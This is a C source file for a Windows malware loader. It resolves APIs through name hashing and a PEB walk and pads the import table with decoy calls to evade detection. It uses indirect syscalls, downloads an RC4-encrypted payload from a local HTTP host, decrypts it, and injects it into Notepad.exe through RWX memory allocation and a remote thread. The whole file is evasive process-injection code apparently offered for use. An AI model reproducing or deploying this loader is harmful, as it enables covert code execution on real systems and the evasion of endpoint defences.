#include "header.h"
#include "structs.h"
#include "peb.h"


#define INTIAL_SEED 7

#ifndef STRUCTS
#include "winternl.h"
#endif // STRUCTS



#define CONTAINING_RECORD(address, type, field) \ ((type *)((PCHAR)(address) - (ULONG PTR)(&((type * )0)->field))


unsigned char code[462];


// InDirect Syscalls: DONE
// Custom GetProcAddr: DONE
// Custom GetModuleHandle: DONE
// API/String Hashing: DONE
// RC4 Encryption: DONE
// Find NotePad: DONE
// Brute Force Key: NOPE

DWORD Fn_OpSSN;
DWORD Fn_AlSSN;
DWORD Fn_WrSSN;
DWORD Fn_CrSSN;
DWORD Fn_WaSSN;
DWORD Fn_ClSSN;

UINT_PTR Fn_OpSys;
UINT_PTR Fn_AlSys;
UINT_PTR Fn_WrSys;
UINT_PTR Fn_CrSys;
UINT_PTR Fn_WaSys;
UINT_PTR Fn_ClSys;

DWORD op = 0x616bcd2b;
DWORD al = 0xb4983c2f;
DWORD wr = 0x92a7f011;
DWORD th = 0x3c2d6449;
DWORD Wa = 0x8541c085;
DWORD Mo = 0x82acbbb8;
DWORD cl = 0xa1775d8e;


DWORD hsh(IN LPCVOID str, BOOL isUnicode) {
	SIZE_T index = 0;
	UINT32 hs = 0;
	SIZE_T Length;

	if (isUnicode) {
		// Calculate length for wide string
		Length = lstrlenW((LPCWSTR)str);
		while (index != Length) {
			hs += ((LPCWSTR)str)[index++];
			hs += hs << INTIAL_SEED;
			hs ^= hs >> 6;
		}
	}
	else {
		// Calculate length for ASCII string
		Length = lstrlenA((LPCSTR)str);
		while (index != Length) {
			hs += ((LPCSTR)str)[index++];
			hs += hs << INTIAL_SEED;
			hs ^= hs >> 6;
		}
	}

	hs += hs << 3;
	hs ^= hs >> 11;
	hs += hs << 15;

	return hs;
}

int randcomp(void) {
	return '0' * -4027 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}
PVOID helper(PVOID *pPAddress) {
	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;
	*(int*)pAddress = randcomp() % 0xFF;

	*pPAddress = pAddress;
	return pAddress;
}

void iatcamo() {
	PVOID pAddress = NULL;

	int* A = (int*)helper(&pAddress);

	if (*A > 350) {
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessage(NULL, NULL);
		
		HeapFree(GetProcessHeap(), 0, pAddress);
	}
}


VOID gSn(IN HMODULE hNDLL, IN DWORD hshName, OUT DWORD* SN, OUT UINT_PTR* SYLL) {
	FARPROC CusProc(IN HMODULE ndll, IN DWORD hshed);
	UINT_PTR FuncAddr = NULL;
	BYTE OpCodes[2] = { 0x0F, 0x05 };

	FuncAddr = (UINT_PTR)CusProc(hNDLL, hshName); // Get Address Of Our Function (NtOpenProcess For Example)

	if (FuncAddr == NULL) {
		//warn("Failed Finding Address");
		return NULL;
	}
	//okay("Got Function Addresss\n\\____0x%p", FuncAddr);

	//info("Getting SSN...");
	*SN = ((PBYTE)(FuncAddr + 4))[0]; // SSN Number is 9/10 Stored 4 bytes From Start
	*SYLL = FuncAddr + 0x12;       //  Syscall number Is Stored 12 bytes From Start Of Function

	if (memcmp(OpCodes, *SYLL, sizeof(OpCodes)) != 0) { // Compare the Found SysOpcodes To The correct ones
		//warn("OpCodes Did Not Match 0x0F, 0x05");
		return NULL;
	}


	//okay("Got SSN [0x%1x]\n\n", *SSN); // Print SSN Number
}

FARPROC CusProc(IN HMODULE ndll, IN DWORD hshed) {
	// Save The Base Address Of Module
	PBYTE pBase = (PBYTE)ndll;

	// Find The Dos Header And Do a Check
	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE) {
		//printf("Not a Valid Dos header");
		return NULL;
	}

	// Find The NT Header And Do a Check, e_lfanew points to it
	PIMAGE_NT_HEADERS pImgNT = (PIMAGE_NT_HEADERS)(pBase + pImgDos->e_lfanew);
	if (pImgNT->Signature != IMAGE_NT_SIGNATURE) {
		//printf("Not a Valid NT Header");
		return NULL;
	}

	// Get The Option Header Address
	IMAGE_OPTIONAL_HEADER pImgOpt = pImgNT->OptionalHeader;


	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgOpt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Save The Addresses Of Names, Functions And the Oridnals
	PDWORD FuncNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FuncAddrArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD FuncOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// Loop Through Each Function And Check if it == The Needed Function And If So
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)(pBase + FuncNameArray[i]); // Name Of Current Function
		DWORD hashed = hsh(pFuncName, FALSE); // Hash The Current Function Name For comparing Against One we Want

		if (hshed == hashed) {
			// Get and Return The Address Of the Current Function
			PVOID pFuncAddr = (PVOID)(pBase + FuncAddrArray[FuncOrdinalArray[i]]);
			return pFuncAddr;
		}
	}
	return NULL;

}

HMODULE CusMod(IN DWORD Name) {
#ifdef _WIN64
	PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB pPeb = (PEB*)(__readgsqword(0x30));
#endif
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InInitializationOrderModuleList.Flink);

	PLIST_ENTRY pListHead = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
	// Get The End(node) of the linked list
	PLIST_ENTRY pListNode = (PLIST_ENTRY)pListHead->Flink;

	do {
		// Check If the Lenght Of module != NULL
		if (pDte->FullDllName.Length != NULL) {
			// Hash The Name Of It and then
			DWORD f_hash = hsh(pDte->FullDllName.Buffer, TRUE);

			// Compare the hash against the Inputted Hash
			if (f_hash == Name) {
#ifdef  STRUCTS
				// Return The Address Of the Correct Module
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				// This one is only Needed If we Arent Using the Current Technique, other one broke my code tho
				return (HMODULE)pDte->Reserved2[0];
#endif //  STRUCTS

			}

			// Point to The Next entry In Linked List
			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);

			// Update the end(node) to be the next end(node)
			pListNode = (PLIST_ENTRY)(pListNode->Flink);
		}
	} while (pListNode != pListHead); // Loop While There are still elemants in the linked list

	return NULL;
}
BOOL rce(IN PBYTE pRc4Key, IN PBYTE pShellcode, IN DWORD dwRc4KeySize, IN DWORD sShellSize) {
	NTSTATUS STATUS = NULL;


	// Make to USTRING  Varibales
	// One is passed as Key and Other Passed As Payload to encrypt/decrypt
	USTRING key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
		data = { .Buffer = pShellcode, .Length = sShellSize, .MaximumLength = sShellSize };

	// Load Needed DLL since SystemFunction32 Is Exported From it
	fn_sys032 pSystemFunction32 = (fn_sys032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
	if ((STATUS = pSystemFunction32(&data, &key)) != 0x0) {
		return FALSE;
	}
	return TRUE;
}

BOOL GetInfo(IN LPCWSTR Name, IN HMODULE hNdll, OUT DWORD* pID) {
	ULONG uReturn1;
	ULONG uReturn2;
	PSYSTEM_PROCESS_INFORMATION zsProcInfo = NULL;
	PVOID ValueToFree = NULL;
	DWORD query = 0xc91abebe;  // Hash Of NtQuerySystemInformation
	NTSTATUS status = NULL;

	_func_NtQuerySystemInformation pQuery = (_func_NtQuerySystemInformation)CusProc(hNdll, query);

	pQuery(SystemProcessInformation, NULL, NULL, &uReturn1);

	zsProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturn1);
	if (zsProcInfo == NULL) {
		return FALSE;
	}
	ValueToFree = zsProcInfo;
	status = pQuery(SystemProcessInformation, zsProcInfo, uReturn1, &uReturn2);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	while (TRUE) {
		if (zsProcInfo->ImageName.Length != NULL && wcscmp(zsProcInfo->ImageName.Buffer, Name) == 0) {
			*pID = zsProcInfo->UniqueProcessId;
			break;
		}

		if (!zsProcInfo->NextEntryOffset) {
			break;
		}
		zsProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)zsProcInfo + zsProcInfo->NextEntryOffset);
	}
	HeapFree(GetProcessHeap(), 0, ValueToFree);
	if (*pID == NULL) {
		return FALSE;
	}
	return TRUE;


}

BOOL dwnld() {

	HINTERNET hSession = WinHttpOpen(L"test", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.30", 80, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/code.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

	if (bResult) {
		bResult = WinHttpReceiveResponse(hRequest, NULL);
	}
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	BOOL bDone = FALSE;

	if (bResult) {
		do {
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				break;
			}
			// Allocate memory for the buffer.
			if (dwSize > 0)
			{
				if (dwSize > sizeof(code))
				{
					return FALSE;
					break;
				}

				// Read the data.
				bResult = WinHttpReadData(hRequest, code, dwSize, &dwDownloaded);
				if (!bResult)
				{
					
					break;
				}

				// Optionally print or process the data here.
				
			}
		} while (dwSize > 0);

	}
	return TRUE;
}



unsigned char key[] = {
	0x4A, 0xF6, 0x2E, 0x83, 0x97, 0x5B, 0xA1, 0x3D, 0x70, 0xE9,
	0x1C, 0xB2, 0x5F, 0x8D, 0x62
};


int main(int argc, char* argv[]) {
	HANDLE hPh = NULL;
	HANDLE hTh = NULL;
	DWORD prId = NULL;
	PVOID rBf = NULL;
	HMODULE hNTDLL = CusMod(Mo);

	iatcamo();

	if (!dwnld()) { return 1; };

	if (!GetInfo(L"Notepad.exe", hNTDLL, &prId)) {
		return EXIT_FAILURE;
	}


	


	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)prId, NULL };
	
	

	size_t c_size = sizeof(code);

	if (!rce(key, code, sizeof(key), c_size)) {
		return 1;
	}


	
	//info("Setting Up...\n");
	gSn(hNTDLL, op, &Fn_OpSSN, &Fn_OpSys);

	NTSTATUS status = p_Op(&hPh, PROCESS_ALL_ACCESS, &OA, &CID);
	if (status != STATUS_SUCCESS) {
		//warn("Failed Opening");
		return EXIT_FAILURE;
	}
	//printf("[%ld] HANDLE: 0x%p\n\n", pID, hProcHandle);

	gSn(hNTDLL, al, &Fn_AlSSN, &Fn_AlSys);
	status = p_Al(hPh, &rBf, 0, &c_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		//warn("Alloc Failed");
		return EXIT_FAILURE;
	}
	//printf("Allocted %d-Bytes [RWX]\n\n", c_size);


	gSn(hNTDLL, wr, &Fn_WrSSN, &Fn_WrSys);
	status = p_Wr(hPh, rBf, code, c_size, NULL);
	if (status != STATUS_SUCCESS) {
		//warn("write failed");
		return EXIT_FAILURE;
	}
	//okay("Wrote Into Buffer");

	gSn(hNTDLL, th, &Fn_CrSSN, &Fn_CrSys);
	status = p_Cr(&hTh, THREAD_ALL_ACCESS, &OA, hPh, (PTHREAD_START_ROUTINE)rBf, NULL, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		//warn("thread fail");
		return EXIT_FAILURE;
	}

	gSn(hNTDLL, Wa, &Fn_WaSSN, &Fn_WaSys);
	status = p_Wa(hTh, FALSE, NULL);
	

	gSn(hNTDLL, cl, &Fn_ClSSN, &Fn_ClSys);

	p_Cl(hPh);
	p_Cl(hTh);


	return EXIT_SUCCESS;
}
